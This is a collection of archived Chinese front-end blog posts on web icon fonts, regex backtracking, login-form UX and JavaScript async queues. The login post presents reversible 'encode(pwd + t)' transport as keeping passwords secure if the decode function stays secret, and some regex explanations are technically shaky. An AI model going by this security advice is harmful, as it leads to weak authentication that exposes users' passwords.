Agreement，然后点击下载字体：&nbsp;转换的拿到的是下面四个文件：用下面一段代码测试下结果： 123456789101112131415161718192021&lt;style type=&quot;text/css&quot;&gt;@font-face &#123; font-family: &apos;barretregular&apos;; src: url(&apos;./font/barret-webfont.eot&apos;); src: url(&apos;./font/barret-webfont.eot?#iefix&apos;) format(&apos;embedded-opentype&apos;), url(&apos;./font/barret-webfont.woff&apos;) format(&apos;woff&apos;), url(&apos;./font/barret-webfont.ttf&apos;) format(&apos;truetype&apos;), url(&apos;./font/barret-webfont.svg#barretregular&apos;) format(&apos;svg&apos;); font-weight: normal; font-style: normal;&#125;div &#123; font-family: &quot;barretregular&quot;; font-size:50px;&#125;&lt;/style&gt;&lt;div&gt; B​C​D​E​F​G​H​I&lt;/div&gt; 也可以直接戳这个 DEMO字体文件下载：barret.ttf and others二、@font-face细节根据 CSS3 草案中的描述，‘@font-face’ 规则允许使用链接到需要时自动激活的字体。这使得用户可以使用在线的字体，而不仅仅拘泥于使用用户端系统内的字体。font-face，拆开来理解，字体的面孔。不管是什么样的面孔，对应的还是同一个码位，而网页设计者需要使用不同的字体来匹配当前的设计。1. local()上面的教程中我给出了两个测试，一个是本地测试，一个是网页测试，本地测试之前需要先安装字体，如果本地已经有 barret 这个字体了，那我们的程序便没有必要在重新去网络上下载这个字体了。这是 CSS 程序应该这样写： 12345@font-face &#123; font-family: &apos;barretregular&apos;; src: local(&quot;barret&quot;), url(&apos;./font/barret.ttf&apos;);&#125; 在解析的时候，会先从本地查找是否有 barret 字体，如果没有就忽略 local 语句，如果有的话就直接应用，忽略后面的 url 参数。除了获取本地字体的作用之外，他还有另外一个 hack 用途，看下面这段程序： 123456789@font-face &#123; font-family: &apos;barretregular&apos;; src: url(&apos;./font/barret-webfont.eot&apos;); src: local(&quot;☺&quot;), url(&apos;./font/barret-webfont.eot?#iefix&apos;) format(&apos;embedded-opentype&apos;), url(&apos;./font/barret-webfont.woff&apos;) format(&apos;woff&apos;), url(&apos;./font/barret-webfont.ttf&apos;) format(&apos;truetype&apos;), url(&apos;./font/barret-webfont.svg#barretregular&apos;) format(&apos;svg&apos;);&#125; 代码中包含 local(“☺”)，local 中是一个笑脸，很显然，这绝对不是一个字体名字，那他的作用是什么呢？前面我们说了，低版本IE 只支持 eot 文件格式的字体，上面的代码中用到了两个 src，低版本IE会应用第一个 src 的结果，但是，他的解析不会在第一个 src 位置停止，而是继续往后读，看到后面的 src 会发送一个无效的 http 请求。若在 url 前加一个 local 可以阻断这个 http 请求的发送。2. unicode-range他的作用是定义字体支持的 Unicode 字符范围，以 “U+” 或者 “u+” 开头，默认是 “U+0-10FFFF”。unicode-range 有三种形式：点，e.g. U+416分段，e.g. U+400-U+4ff通配符，e.g. U+4??(U+400-U+4FF)举几个例子：大小写字符以及标点符号1unicode-range: U+0021-U+007B;大小写字符和数字1234unicode-range: U+0030-U+0039, / 0-9 * U+0041-U+005A, / Uppercase A-Z / U+0061-U+007A; / Lowercase a-z /小写字母，大写字母 T，和 “.” 号1234unicode-range: U+0054-U+0054, / T / U+0061-U+007A, / a-z / U+002E-U+002E; / . (period) */这玩意儿有啥用途呢？@font-face 有相关属性 unicode-range，可用类似这样的一段 CSS 来指定以中文字体显示弯引号（这是 CSS3 特性，支持还不广泛，但对于这种非关键样式来说够用了）： 123456789@font-face &#123; font-family: &quot;Chinese Quotes&quot;; src: local(&quot;Some Chinese Font&quot;); unicode-range: U+2018-2019, U+201C-201D;&#125;body &#123; font-family: &quot;Chinese Quotes&quot;, &quot;Some Latin Font&quot;, &quot;Some Chinese Font&quot;, generic-family;&#125; 同理，这一招也可以用于破折号、间隔号等和西文标点共享码位的中文标点。 可以戳知乎上的这一贴。 三、优缺点 优点有一大堆，图标的颜色可以随意修改，大小也是可以随便控制的，不需要折腾图片与文字的对齐问题，因为他本身就是文字，还可以使用阴影、文字渐变等 CSS3 的效果，总之就像操作一般字体一样处理他们，该有的特点都有。 缺点也是十分明显的，慢速网络以及翻墙代理下情况特别糟糕。外国很多网站的页面都使用了网络字体，而网络字体下载是需要时间的，有些字体可能还比较大，在下载完毕之前，页面有文字的地方都没有渲染出来，体验不好的情况需要等待三五秒中。不过这种情况还是可以优化的，先用一般字体顶替样式，等下载完毕了再利用 JS 来重新渲染，不过这个代码比较高，而且也不好判断何时下载完成了。 四、小结 本文的目的是展示 web icon 的从无到有的一个过程，一些网站提供了很多不错的 webIcon 字库，如果有需求可以直接去网站上下载，自己制作的话成本太高。 五、参考资料 http://www.w3.org/TR/css3-fonts/#the-font-face-rule W3.ORGhttp://www.w3help.org/zh-cn/causes/RF1001 W3Helphttp://www.php100.com/manual/css3_0/@font-face.shtml Font-Facehttp://www.fontsquirrel.com/fontface/generator Tool]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webicon</tag>
        <tag>font-face</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进阶正则表达式]]></title>
    <url>%2Fblog%2F2014%2F01%2F18%2F2014-01-18-cb-how-regular-expressions-work%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关于正则表达式，网上可以搜到一大片文章，我之前也搜集了一些资料，并做了排版整理，可以看这篇文章http://www.cnblogs.com/hustskyking/archive/2013/06/04/RegExp.html，作为基础入门讲解，这篇文章说的十分到位。记得最开始学习正则，是使用 php 做一个爬虫程序。为了获取指定的信息，必须用一定的方式把有规律的数据匹配出来，而正则是首选。下面是当时写的爬虫程序的一个代码片段： 12345678910111213$regdata = &quot;/&lt;font size=&quot;\&quot;3\&quot;&quot;&gt;((?&lt;bf&gt;[^&lt;]*)&lt;br \=&quot;&quot;&gt;)&#123;0,1&#125;⊙(?&lt;bs&gt;.&#123;12&#125;)\S*\s/&quot;;//获取页面$html = file_get_contents(&apos;http://www.qnwz.cn/html/daodu/201107/282277.html&apos;);$html = iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $html);if ($html == &apos;&apos;) &#123; die(&quot;&lt;hr&gt;出错：【错】无法打开《青年文摘》页面&lt;hr&gt;&quot;);&#125;//匹配页面信息preg_match_all($regdata, $html, $mdata);print_r($mdata); 当时写代码还真是欢乐多，什么都不懂，什么都是新知识，学起来津津有味。我觉得学习知识一定要把握最基本的原理，先把一个知识的大概轮廓搞清楚，然后学习怎么去使用他，完了就是深入学习，了解底层基础实现。很多人解决问题都是靠经验，这个当然很重要，但如果我们弄懂了一项技术最底层的实现，完全可以靠自己的推断分析出问题的根源。我对一些公司的招聘要求特别不满，说什么要三年五年Javascript编程经验云云，经验当然和时间成正相关，但是对于那些没有三年五年工作经验却照样能够解决实际的人呢？算是小小的吐槽吧，下面进入正题。一、正则表达式的工作机制画了一个草图，简单的说明了下正则表达式的工作原理。 123456789101112131415161718 +--------+ | 编译 | +--------+ | ↓+----------------+| 设置开始位置 |←---------++----------------+ ↑ | | ↓ 其 |+----------------+ 他 || 匹配 &lt; 回溯 | 路 |+----------------+ 径 | | | ↓ |+----------------+ || 成功 or 失败 |---------→++----------------+ 你写的任何一个正则直接量或者 RegExp 都会被浏览器编译为一个原生代码程序，第一次匹配是从头个字符开始，匹配成功时，他会查看是否还有其他的路径没有匹配到，如果有的话，回退到上一次成功匹配的位置，然后重复第二步操作，不过此时开始匹配的位置（lastIndex）是上次成功位置加 1. 如果要深入了解正则表达式的内部原理，必须先理解匹配过程的一个基础环节&mdash;&mdash;回溯，他是驱动正则的一个基本动力，也是性能消耗、计算消耗的根源。二、回溯正则表达式中出现最多的是分支和量词，上面的 demo 中可以很清楚的看到 hi 和 hello 这两个分支，当匹配到第一个字符 h 之后，进入 (i|ello) 的分支选择，首先是进入 i 分支，当 i 分支匹配完了之后，再回到分支选择的位置，重新选择分支。简单点说，分支就是 | 操作符带来的多项选择问题，而量词指的是诸如 *, +?, {m,n} 之类的符号，正则表达式必须决定何时尝试匹配更多的字符。下面结合回溯详细说说分支和量词。1. 分支继续分析上面那个案例。“Lalala. Hi, barret. Hello, John”.match(/H(i|ello), barret/g),首先会查找 H 字符，在第九位找到 H 之后，正则子表达式提供了两个选择 (i|ello)，程序会先拿到最左边的那个分支，进入分支后，在第十位匹配到了 i，接着匹配下一个字符，下一个字符是逗号，接着刚才的位置又匹配到了这个逗号，然后再匹配下一个，依次类推，直到完整匹配到整个正则的内容，此时程序会在Hi, barret后面做一个标记，表示在这里进行了一次成功的匹配。但程序到此并没有结束，因为后面加了一个全局参数，依然使用这个分支往后匹配，很显然，到了 Hello 的时候，Hi 分支匹配不了了，于是程序会回溯到刚才我们做标记的位置，并进入第二个分支，从做标记的位置重新开始匹配，依次循环。只要正则表达式没有尝试完所有的可选项，他就会回溯到最近的决策点（也就是上次匹配成功的位置）。2. 量词量词这个概念特别简单，只是在匹配过程中有贪婪匹配和懒惰匹配两种模式，结合回溯的概念理解稍微复杂。还是用几个例子来说明。1) 贪婪 123str = &quot;AB1111BA111BA&quot;;reg = /AB[\s\S]+BA/;console.log(str.match(reg)); 首先是匹配AB，遇到了 [\s\S]+，这是贪婪模式的匹配，他会一口吞掉后面所有的字符，也就是如果 reg 的内容为 AB[\s\S]+，那后面的就不用看了，直接全部匹配，而往后看，正则后面还有B字符，所以他会先回溯到倒数第一个字符，匹配看是否为 B，显然倒数第一个字符不是B，于是他又接着回溯，找到了B字母，找到之后就不继续回溯了，而是往后继续匹配，此刻匹配的是字符A，程序发现紧跟B后的字母确实是A，那此时匹配就结束了。如果没有看明白，可以再读读下面这个图： 1234567 REG: /AB[\s\S]+BA/MATCH: A 匹配第一个字符 AB 匹配第二个字符 AB1111BA111BA [\s\S]+ 贪婪吞并所有字符 AB1111BA111BA 回溯，匹配字符B AB1111BA111B 找到字符B，继续匹配A AB1111BA111BA 找到字符A，匹配完成，停止匹配 2) 懒惰（非贪婪） 123str = &quot;AB1111BA111BA&quot;;reg = /AB[\s\S]+?BA/;console.log(str.match(reg)); 与上面不同的是，reg 中多了一个 ? 号，此时的匹配模式为懒惰模式，也叫做非贪婪匹配。此时的匹配流程是，先匹配AB，遇到[\s\S]+?，程序尝试跳过并开始匹配后面的字符B，往后查看的时候，发现是数字1，不是要匹配的内容，继续往后匹配，知道遇到字符B，然后匹配A，发现紧接着B后面就有一个A，于是宣布匹配完成，停止程序。 12345678910 REG: /AB[\s\S]+BA/MATCH: A 匹配第一个字符 AB 匹配第二个字符 AB [\s\S]+? 非贪婪跳过并开始匹配B AB1 不是B，回溯，继续匹配 AB11 不是B，回溯，继续匹配 AB111 不是B，回溯，继续匹配 AB1111 不是B，回溯，继续匹配 AB1111B 找到字符B，继续匹配A AB1111BA 找到字符A，匹配完成，停止匹配 如果匹配的内容是 AB1111BA，那贪婪和非贪婪方式的正则是等价的，但是内部的匹配原理还是有区别的。为了高效运用正则，必须搞清楚使用正则时会遇到那些性能消耗问题。三、逗比的程序1234//去测试下这句代码&quot;TTTTTTTT&quot;.match(/(T+T+)+K/);//然后把前面的T重复次数改成30//P.S:小心风扇狂转，CPU暴涨我们来分析下上面这段代码，上面使用的都是贪婪模式，那么他会这样做： 1234567 REG: (T+T+)+KMATCH: ①第一个T+匹配前7个T，第二个T+匹配最后一个T，没找到K，宣布失败，回溯到最开始位置 ②第一个T+匹配前6个T，第二个T+匹配最后两个T，没找到K，宣布失败，回溯到最开始位置 ③... ... 接着还会考虑(T+T+)+后面的 + 号，接着另一轮的尝试。 ⑦... ... 这段程序并不会智能的去检测字符串中是否存在 K，如果匹配失败，他会选择其他的匹配方式（路径）去匹配，从而造成疯狂的回溯和重新匹配，结果可想而知。这是回溯失控的典型例子。四、前瞻和反向引用1. 前瞻和引用前瞻有两种，一种是负向前瞻，JS中使用 (?!xxx) 来表示，他的作用是对后面要匹配的内容做一个预判断，如果后面的内容是xxx，则此段内容匹配失败，跳过去重新开始匹配。另一种是正向前瞻，(?=xxx)，匹配方式和上面相反，还有一个长的类似的是 (?:xxx),这个是匹配xxx，他是非捕获性分组匹配，即匹配的内容不会创建反向引用。具体内容可以去文章开头提到的文档中查看。反向引用，这个在 replace 中用的比较多，在 replace 中：字符替换文本$1、$2、…、$99与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。$&amp;与 regexp 相匹配的子串。$`位于匹配子串左侧的文本。$’位于匹配子串右侧的文本。$$直接量符号。而在正则表达中，主要就是 \1, \2 之类的数字引用。前瞻和反向引用使用恰当可以大大的减少正则对资源的消耗。举个例子来简单说明下这几个东西： 12问题：使用正则匹配过滤后缀名为 .css 和 .js 的文件。 如：test.wow.js test.wow.css test.js.js等等。 有人会立马想到使用负向前瞻，即： 123456//过滤js文件/(?!.+\.js$).*/.exec(&quot;test.wow.js&quot;)//过滤js和css文件/(?!.+\.js$|.+\.css$).*/.exec(&quot;test.wow.js&quot;)/(?!.+\.js$|.+\.css$).*/.exec(&quot;test.wow.html&quot;) 但是你自己去测试下，拿到的结果是什么。匹配非js和非css文件可以拿到正确的文件名，但是我们期望这个表达式对js和css文件的匹配结果是null，上面的表达式却做不到。问题是什么，因为(?!xxx)和(?=xxx)都会消耗字符，在做预判断的时候把 .js 和 .css 给消耗了，所以这里我们必须使用非捕获模式。 12/(?:(?!.+\.js$|.+\.css$).)*/.exec(&quot;test.wow.html&quot;);/(?:(?!.+\.js$|.+\.css$).)*/.exec(&quot;test.wow.js&quot;); 我们来分析下这个正则： 123456789(?:(?!.+\.js$|.+\.css$).)*--- ---------------- - | | | +----------------------+ ↓ |非捕获，内部只有一个占位字符 | ↓ 负向前瞻以.js和.css结尾的字符串 最后一个星号是贪婪匹配，直接吞掉全部字符。这里讲的算是有点复杂了，不过在稍复杂的正则中，这些都是很基础的东西了，想在这方面提高的童鞋可以多研究下。2. 原子组JavaScript的正则算是比较弱的，他没有分组命名、递归、原子组等功能特别强的匹配模式，不过我们可以利用一些组合方式达到自己的目的。上面的例子中，我们实际上用正则实现了一个或和与的功能，上面的例子体现的还不是特别明显，再写个例子来展示下： 12345str1 = &quot;我(wo)叫(jiao)李(li)靖(jing)&quot;;str2 = &quot;李(li)靖(jing)我(wo)叫(jiao)&quot;;reg = /(?=.*?我)(?=.*?叫)(?=.*?李)(?=.*?靖)/;console.log(reg.test(str1)); //trueconsole.log(reg.test(str2)); //true 不管怎么打乱顺序，只要string中包含\我”，\是”，\李”，\靖”这四个字，结果都是true。类似(?=xxx)\1，就相当于一个原子组，原子组的作用就是消除回溯，只要是这种模式匹配过的地方，回溯时都不会到这里和他之前的地方。上面的程序“TTTTTTTT”.match(/(T+T+)+K/);可以通过原子组的方式处理： 1&quot;TTTTTTTT&quot;.match(/(?=(T+T+))\2+K/); 如此便能彻底消除回溯失控问题。五、小结关于正则的学习，重点是要多练习多实践，并且多尝试用不同的方案去解决一个正则问题，一个很典型的例子，去除字符串首尾的空白，尝试用5-10种不同的正则去测试，并思考哪些方式的效率最高，为什么？通过这一连串的思考可以带动学习的兴趣，提高学习效率~ 相关文章：玩转正则之Highlight代码高亮]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从登录框看前端]]></title>
    <url>%2Fblog%2F2014%2F01%2F13%2F2014-01-13-cb-user-exprience-in-login-box%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 我们会骂 12306 的网站界面挫，效果差，速度慢，回头看看自己写的代码，是不是也一样的狗血！在前端，很多看似简单的东西，内藏无数玄机。本文将以一个小小的登录框为入口，谈一谈如何完善自己的程序。在很多人眼里，前端就是 DIV+CSS+JQuery，甚至还有些人停留在 table 布局的迷雾当中（这些人应该跟 IE6 一样，随着历史渐渐被尘封）。但，前端绝不是你所看到的那样。举个例子，登录页面几乎是每一个系统不可或缺的模块，很多娴熟的人可以在一刻钟之内写好一个登录页面，两个 input，一个提交 button，万事 OK。 123Username: &lt;input type=&quot;text&quot;&gt;&lt;br&gt;Password: &lt;input type=&quot;password&quot;&gt;&lt;br&gt;&lt;input type=&quot;sbumit&quot;&gt; 当然，作为一个完成登录验证的页面，这几个元素完全可以胜任，但我只能说你完成了一个可以用的页面，这种页面完全没有用户体验可言，完全不符合一个具有的严谨的思维的程序员的作风！本文地址：http://www.cnblogs.com/hustskyking/p/user-exprience-in-login-box.html一、一切以良好用户体验为基础1. 视觉效果界面的设计就不用多说了，一般情况这个属于美工的活儿，这里要谈的是几个最基础的点。第一，你的页面兼容性如何？各个元素的长宽、行高等在不同浏览器上是否表现一致，如果这个都没有保证，那一定是不合格的。第二，移动终端上的体验问题，如今很多页面 PC 和移动终端都用的一套结构，也就是我们所说的响应式布局，本博客就使用了响应式布局，缩小窗口可以看到效果，响应式布局是为了让不同的移动终端也能得到同样的优质体验，可是很多开发者却忽略了横屏时的效果。下面是常见的几个移动终端的像素比例：Mobilepx rateIphone5320568Iphone4320480Galaxy S 3/4360640Lumia 920384640iPad768*1024照顾用户的响应式布局除了要考虑这些屏幕的横屏，还得把竖屏考虑进去。我简单的做了一个登陆页面：正确的账号是：barret，密码是：123，你可以用错误的信息先去测试下~可以戳这个DEMO：http://qianduannotes.duapp.com/demo/login/login.html2. 交互前面那种方式，点击提交按钮，送到后台去验证，验证没有通过则回到登录页面，这也算是一种交互，不过这种交互的体验是特别不好的，每次都得重新刷新页面，应该利用 ajax 异步去验证表单。为了省去用户的聚焦点击，可以按照下面的思路来做：用户名为空，或者格式不对 -》 提示错误，清空密码框，聚焦到用户名框，并全选用户名用户名不存在 -》同上密码错误 -》 提示错误，清空密码框，聚焦密码框聚焦到密码框，全选密码告诉用户哪个地方出了问题，并提前预知用户遇到这些问题之后会做哪些事情，我们能够用程序解决的事情，绝不麻烦用户亲自动手操作。当提示用户名错误的时候，用户肯定会回到输入框重新输入，这个时候我们已经聚焦到用户框，并全选了之前的输入，方面用户进行删除操作。类似这样的交互，我们应该提前做预判断。3. 状态提示什么是状态提示？有时候因为网络原因，点击提交 button 之后，ajax 传输半天没有响应，用户等了半天页面一点提示都没有，这个肯定会让用户焦急的。回头看看 Gmail，一个把 ajax 发挥到极致的 web应用，在用户体验上做的也是相当给力的，登录邮箱的时候一个 loading 动画，旁边还放了一个加载基本HTML（供慢速网络使用），每一个操作都有提示，提示中还有一个撤销操作的按钮，数据进行加载的时候，如果加载时间过长，期间会进行多次不同的提示，并在最后给出一个确切的结果，对于一个登录框而言，需要做到这些：一个明确的用于状态提示的 box等待 3s，结果没有出来，提示用户继续等待等待 6s，结果没有出来，提示用户网络不畅通设置 10s 为超时，并告知用户提交表单失败这些东西的实现并没有太多的技术难度，但是可以给慢速网络下的用户带来很好的体验和安全感。4. 安全传输用户最担心的是账号密码被截获，或者因为密码一处多用，不希望别人看到密码的明文，既然用户担心，我们就应该想办法来处理。把密码和时间戳叠加，然后加密，传到后台的是加密的结果以及这个时间戳，如下： 1234567// 前端t = new Date();s = encode(pwd + t);post(s, t)// 后台decode(s) === pwd + t 这样就可以保证密码的隐蔽性，如果 hacker 不知道 decode 函数，即便是拿到了 s 和 t，也是徒劳。关于安全传输，之前也写过相关的文章，OAuth认证原理及HTTP下的密码安全传输。如果要做到在用户输入的时候就绝对安全，那就必须使用类似 支付宝安全插件 这样的东西了。他的原理就是在页面中嵌入一个控件，这个控件与页面之间是相互屏蔽的，在控件内部输入也只有控件拿得到输入信息。5. 数据走缓存表单提交首选应该是 post，但是也不排除会用 get 方式提交，那么这个时候就应该考虑数据缓存了，如果请求的 url 相同，程序就会直接从浏览器的缓存中拿数据，并给出状态是 status: 200 OK(from cache)，为了避免这些常识性的问题，记得在请求的参数中加点东西。 12_t = new Date*1_n = Math.random 为了保证参数的绝对唯一性，甚至可以把 时间戳 和随机数叠加起来用 1_s = (new Date*1 + Math.random*1E5)/1E5 6. 渐进增强 渐进增强这个词一般是，不支持 javascript 或者对 javascript 支持度不太好的浏览器上利用其它方式实现，或者告诉用户什么原因不能用，就是一种蜕化处理。目前不支持 javascript 的浏览器应该是绝迹了，当然也不是绝对，kindle 内置的浏览器对 javascript 的支持度就不高，或者根本就不支持。还有一种情况是用户禁用了 javascript，这个比例很小，开发者会这么干，一般的用户不会乱改浏览器设置。但是我们的程序，尤其是关键的部位（如搜索，登录，注册等）必须要考虑这一少部分群体。一般采用的方式是：1）使用 noscript 标签，这个是最常用，也是最实用的。2）hack 方式，document.write(“&lt;” + “!–”) 1document.write(&quot;&lt;&quot; +=&quot;&quot; &quot;!--&quot;);=&quot;&quot; code...=&quot;&quot; 如果浏览器不支持=&quot;&quot; javascript，将显示这中间的内容=&quot;&quot; document.write(&quot;--&quot;=&quot;&quot; &quot;=&quot;&quot;&gt;&quot;); &lt;/“&gt; 这是一种特别巧妙的处理手段，也是值得推荐的。7. 浏览器后退按钮这个在注册或者登陆的时候是一个普遍的问题，登陆之后，跳转到另外一个页面，我的鼠标有两个侧键，是用于前进和后退的，有时候会误点侧键，这个时候页面又会回到之前的登录页面，但事实是用户已经登录了，所有页面的状态都应该是已登录的，不管什么情况下都不应该让用户在看到这个页面。用户的点击操作会引发上面的问题，而程序 history.go(-1) &lt; history.back() 也会有一样的bug。这样的问题处理方案比较简单，ajax 拿到 success 的状态码时立刻做跳转，但是这里不能用 window.location.href，这样浏览器还是会记录这个登录历史，应该使用 window.location.replace，替换当前历史记录。8. 记住密码用户最烦的就是每次登录页面都要输入长长的账号密码，如果没有勾选\记住密码”，则用户的登录状态保存在回话的 session 中，关闭页面或者浏览器的时候，回话结束，session 被删除，这样当用户下次登录的时候又需要重新输入密码。表单页面的\记住密码”复选框默认状态应该是已选择，用户的潜意识行为都是要少操作的。当用户提交信息成功之后，直接在 cookie 中保存账号密码？这样的做法显然是不合理的，密码怎么能够明文保存呢，有人会想到加密处理密码然后再保存，或者使用服务器来设置 cookie，这些做法都是可以的，不过最好的方式是，当用户成功提交信息时，服务器给前端提供一个 token，这个 token 是用于自动登录的，我们只需要保存 token 就行了，这样就很好的避免了 cookie 中存放用户隐私信息了。还有一个要注意的是，当用户取消了\记住密码”的复选框时，应该立即清除相关 cookie。二、其他相关的几个点1. 用户忘记密码如果用户很长时间没有来你的网站，他可能会忘记自己设置的密码，一些奇葩的用户甚至会忘记自己的用户名，但是用户永远是没有错的，出错的只有我们的程序和写程序的人。对于忘记密码的人，可以在填写密码的旁边加上一个链接 \忘记密码？”，让用户利用邮箱或者绑定的手机来找到密码，对于忘记密码以及用户名的人，内伤中… @undefined 13# 14# 正解2. 脚本注入表单信息应该做正则匹配，或者信息的过滤，防止脚本注入，这个主要是后台要考虑的问题，就不多说了。3. 多次提交我们发微博的时候经常会遇到的问题，因为网络原因，会多次点击发布按钮，这个问题有多种处理方案：发布之前先从服务器拿 token，该 token 只有一次有效后端判断一定时间内用户发布的多条信息，相同的信息去重…三、容易出错的几个知识点1. setRequestHeader利用 ajax 来 post 信息，有的人可能遇到过，后台拿不到数据。原因是没有重写 请求头的 Content-Type， 123456xhr.open(&quot;POST&quot;, url, true);xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);xhr.send($.param(&#123; &quot;user&quot;:$(&quot;#user&quot;).val(), &quot;pwd&quot;:$(&quot;#pwd&quot;).val()&#125;)); 一般浏览器不支持 GET 方式时 xhr.send 中添加参数，但是 POST 是可以，也是必须的，如果没有设置 Content-Type 的头部，数据送到后端便没办法解析成 key-value 的模式，后台(PHP)通过 $_POST 也拿不到数据。2. checkbox这里也是一个体验问题，一些人把 checkbox 和他相关的文字分开写，结果没有使用 label 来指向，如： 1&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;&gt;记住密码 很显然，我们点击后面的文字是不会让 input 改变状态的，有些人会这么处理： 1&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;&gt;记住密码&lt;/label&gt; 这样处理之后，点击文字当然可以选中 input，但是这种处理方式是不合理的，label 本来就是标记 input 框用的，他的内容应该是文字，不应该包含 input 这个框，所以合理的做法应该是这样： 12&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot; id=&quot;rem&quot;&gt;&lt;label for=&quot;rem&quot;&gt;记住密码&lt;/label&gt; 四、小结 上面说了一大堆，很多问题都是站在用户的角度去思考的，我们是程序员，但是我们也是用户，我们会吐槽，但是我们也会被吐槽。把用户体验做到极致，这个十分重要，不要放过任何一个细节！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript异步编程原理]]></title>
    <url>%2Fblog%2F2014%2F01%2F05%2F2014-01-05-cb-javascript-asynchronous-programming%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 众所周知，JavaScript 的执行环境是单线程的，所谓的单线程就是一次只能完成一个任务，其任务的调度方式就是排队，这就和火车站洗手间门口的等待一样，前面的那个人没有搞定，你就只能站在后面排队等着。在事件队列中加一个延时，这样的问题便可以得到缓解。 12345A: 嘿，哥们儿，快点！B: 我要三分钟，你先等着，完了叫你~A: 好的，记得叫我啊~ 你（C）也等着吧，完了叫你~C: 嗯！... 告诉后面排队的人一个准确的时间，这样后面的人就可以利用这段时间去干点别的事情，而不是所有的人都排在队列后抱怨。我写了一段程序来解决这个问题： 1234567891011121314151617181920212223242526272829303132333435/*** @author Barret Lee* @email barret.china@gmail.com* @description 事件队列管理，含延时*/var Q = &#123; // 保存队列信息 a: [], // 添加到队列 queue q: function(d)&#123; // 添加到队列如果不是函数或者数字则不处理 if(!/function|number/.test(typeof d)) return; Q.a.push(d); // 返回对自身的引用 return Q; &#125;, // 执行队列 dequeue d: function()&#123; var s = Q.a.shift(); // 如果已经到了队列尽头则返回 if(!s) return; // 如果是函数，直接执行，然后继续 dequeue if(typeof s === &quot;function&quot;) &#123; s(), Q.d(); return; &#125; // 如果是数字，该数字作为延迟时间，延迟 dequeue setTimeout(function()&#123; Q.d(); &#125;, s); &#125;&#125;; 这段程序加了很多注释，相信有 JS 基础的童鞋都能够看懂，利用上面这段代码测试下： 123456789101112131415161718192021// 进程记录函数function record(s)&#123; var div = document.createElement(&quot;div&quot;); div.innerHTML = s; console.log(s); document.body.appendChild(div);&#125;Q.q(function()&#123; record(&quot;0 &lt;i&gt;3s 之后搞定，0 把 1 叫进来&lt;/i&gt;&quot;);&#125;).q(3000) // 延时 3s.q(function()&#123; record(&quot;1 &lt;i&gt;2s 之后搞定，1 把 2 叫进来&lt;/i&gt;&quot;);&#125;).q(2000) // 延时 2s.q(function()&#123; record(&quot;2 &lt;span&gt;后面没人了，OK，厕所关门~&lt;/span&gt;&quot;);&#125;).d(); // 执行队列 可以戳戳这个 DEMO。也可以直接运行这段程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/*** @author Barret Lee* @email barret.china@gmail.com* @description 事件队列管理，含延时*/var Q = &#123; // 保存队列信息 a: [], // 添加到队列 queue q: function(d)&#123; // 添加到队列如果不是函数或者数字则不处理 if(!/function|number/.test(typeof d)) return; Q.a.push(d); // 返回对自身的引用 return Q; &#125;, // 执行队列 dequeue d: function()&#123; var s = Q.a.shift(); // 如果已经到了队列尽头则返回 if(!s) return; // 如果是函数，直接执行，然后继续 dequeue if(typeof s === &quot;function&quot;) &#123; s(), Q.d(); return; &#125; // 如果是数字，该数字作为延迟时间，延迟 dequeue setTimeout(function()&#123; Q.d(); &#125;, s); &#125;&#125;;function record(s)&#123; var div = document.createElement(&quot;div&quot;); div.innerHTML = s; console.log(s); document.body.appendChild(div);&#125;Q.q(function()&#123; record(&quot;0 &lt;i&gt;3s 之后搞定，0 把 1 叫进来&lt;/i&gt;&quot;);&#125;).q(3000).q(function()&#123; record(&quot;1 &lt;i&gt;2s 之后搞定，1 把 2 叫进来&lt;/i&gt;&quot;);&#125;).q(2000).q(function()&#123; record(&quot;2 &lt;span&gt;后面没人了，OK，厕所关门~&lt;/span&gt;&quot;);&#125;).d();//事件队列管理，含延时 &nbsp;本文地址：http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html，转载请注明出处。一、Javascript 异步编程原理显然，上面这种方式和银行取号等待有些类似，只不过银行取号我们并不知道上一个人需要多久才会完成。这是一种非阻塞的方式处理问题。下面来探讨下 JavaScript 中的异步编程原理。1. setTimeout 函数的弊端延时处理当然少不了 setTimeout 这个神器，很多人对 setTimeout 函数的理解就是：延时为 n 的话，函数会在 n 毫秒之后执行。事实上并非如此，这里存在三个问题，一个是 setTimeout 函数的及时性问题，可以测试下面这串代码： 123456var d = new Date, count = 0, f, timer;timer = setInterval(f = function ()&#123; if(new Date - d &gt; 1000) clearInterval(timer), console.log(count); count++;&#125;, 0); 可以看出 1s 中运行的次数大概在 200次 左右，有人会说那是因为 new Date 和 函数作用域的转换消耗了时间，其实不然，你可以再试试这段代码： 12345678var d = new Date, count = 0;while(true) &#123; if(new Date - d &gt; 1000) &#123; console.log(count); break; &#125; count++;&#125; 我这里显示的是 351813，也就是说 count 累加了 35W+ 次，这说明了什么呢？setInterval 和 setTimeout 函数运转的最短周期是 5ms 左右，这个数值在 HTML规范 中也是有提到的: 12345. Let timeout be the second method argument, or zero if the argument was omitted.如果 timeout 参数没有写，默认为 07. If nesting level is greater than 5, and timeout is less than 4, then increase timeout to 4.如果嵌套的层次大于 5 ，并且 timeout 设置的数值小于 4 则直接取 4. 为了让函数可以更快速的相应，部分浏览器提供了更加高级的接口（当 timeout 为 0 的时候，可以使用下面的方式替代，速度更快）：requestAnimationFrame 它允许 JavaScript 以 60+帧/s 的速度处理动画，他的运行时间间隔比 setTimeout 是要短很多的。 